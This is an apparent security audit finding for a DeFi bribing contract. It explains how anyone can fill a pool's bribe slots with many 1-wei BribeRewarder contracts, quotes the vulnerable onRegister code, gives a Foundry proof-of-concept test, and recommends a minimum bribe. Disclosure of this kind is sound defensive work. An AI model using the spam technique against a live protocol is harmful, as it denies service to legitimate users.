# Users can lock down bribing for pools

## Summary
By abusing `MAX_BRIBES_PER_POOL` the lack of minimum bribe amount users can create multiple `BribeRewarder` contracts and reach the cap  preventing other users from making meaningful bids.

## Vulnerability Detail
A user is allowed to create as many `BribeRewarder` contracts as they wish without any limitation. Because of that They can simply deposit and bid only 1 wei worth of the token and DOS the `BribeRewarder::bribe` function for a specific pool for an undefined period of time as there isn't also a limit on how many periods thy can bribe for. Another option is to DOS bribing for all pools for a few periods.


```solidity
    function onRegister() external override {
        IBribeRewarder rewarder = IBribeRewarder(msg.sender);

        _checkRegisterCaller(rewarder);

        uint256 currentPeriodId = _currentVotingPeriodId;
        (address pool, uint256[] memory periods) = rewarder.getBribePeriods();
        for (uint256 i = 0; i < periods.length; ++i) {
            // TODO check if rewarder token + pool  is already registered

            require(periods[i] >= currentPeriodId, "wrong period");
            require(_bribesPerPriod[periods[i]][pool].length + 1 <= Constants.MAX_BRIBES_PER_POOL, "too much bribes");
            _bribesPerPriod[periods[i]][pool].push(rewarder);
        }
    }
```
## Impact
POC
```solidity
     function testDOS() public {
        vm.startPrank(alice);
        ERC20Mock(address(rewardToken)).mint(alice,100_000_000_000);
        BribeRewarder[10] memory rewarders;
        for(uint256 i=0;i<5;i++){
            rewarders[i]= BribeRewarder(payable(address(factory.createBribeRewarder(rewardToken, pool))));
            rewardToken.approve(address(rewarders[i]),10000);
            rewarders[i].fundAndBribe(2,100,1);
        }   

        IBribeRewarder[] memory rewarderss;
        rewarderss = _voterMock.getPoolBribesForPeriod(100, pool);
        assertEq(5, rewarderss.length);
    }
```

Functionality of the project can be DOSed for minimum amount of funds.

## Recommendation
Set a minimum amount of tokens for bribing in order to make the attack  much harder on the attacker.
